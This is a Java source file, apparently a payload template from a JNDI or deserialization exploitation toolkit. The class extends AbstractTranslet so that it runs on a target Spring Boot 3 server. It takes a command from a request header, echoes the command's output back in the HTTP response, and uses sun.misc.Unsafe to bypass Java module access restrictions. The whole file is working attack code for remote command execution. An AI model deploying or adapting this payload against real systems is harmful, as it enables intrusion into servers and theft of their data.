package com.qi4l.jndi.template.echo;


import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import sun.misc.Unsafe;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class Springboot3Echo extends AbstractTranslet {

    public Springboot3Echo(){
        Object originalModule = patchModule(this.getClass(), null);
        System.out.println("=== Springboot3Echo 构造函数被调用 ===");
        try {
            Class<?> requestContextHolderClass = Class.forName("org.springframework.web.context.request.RequestContextHolder");
            Method getRequestAttributesMethod = requestContextHolderClass.getMethod("getRequestAttributes");
            Object requestAttributes = getRequestAttributesMethod.invoke(null);
            if (requestAttributes != null) {
                Class<?> servletRequestAttributesClass = Class.forName("org.springframework.web.context.request.ServletRequestAttributes");
                Method getRequestMethod = servletRequestAttributesClass.getMethod("getRequest");
                Method getResponseMethod = servletRequestAttributesClass.getMethod("getResponse");
                Object                    request           =  getRequestMethod.invoke(requestAttributes);
                Object                    response          =  getResponseMethod.invoke(requestAttributes);
                Class<?> httpServletRequestClass = Class.forName("jakarta.servlet.http.HttpServletRequest");
                Class<?> httpServletResponseClass = Class.forName("jakarta.servlet.http.HttpServletResponse");
                Method getHeaderMethod = httpServletRequestClass.getMethod("getHeader", String.class);
                String                                                    cmd               = (String) getHeaderMethod.invoke(request, CMD_HEADER);
                if (cmd != null && !cmd.isEmpty()) {
                    // 获取Writer并写入响应
                    Method getWriterMethod = httpServletResponseClass.getMethod("getWriter");
                    Object writer = getWriterMethod.invoke(response);
                    // 3. 获取PrintWriter类和方法
                    Class<?> printWriterClass = Class.forName("java.io.PrintWriter");
                    Method writeMethod = printWriterClass.getMethod("write", String.class);
                    Method flushMethod = printWriterClass.getMethod("flush");
                    Method closeMethod = printWriterClass.getMethod("close");
                    writeMethod.invoke(writer, new String(q(cmd).toByteArray()));
                    flushMethod.invoke(writer);
                    closeMethod.invoke(writer);
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static String CMD_HEADER;
    public static java.io.ByteArrayOutputStream q(String cmd) {
        return null;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
    private Object patchModule(Class clazz, Object originalModule) {
        try {
            Class UnsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = UnsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Unsafe unsafe = (Unsafe) unsafeField.get(null);
            if (originalModule == null) {
                originalModule = Class.class.getMethod("getModule").invoke(Object.class);
            }
            Class currentClass = clazz;
            long  addr         = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
            return unsafe.getAndSetObject(currentClass, addr, originalModule);
        } catch (Exception e) {
        }
        return null;
    }
}

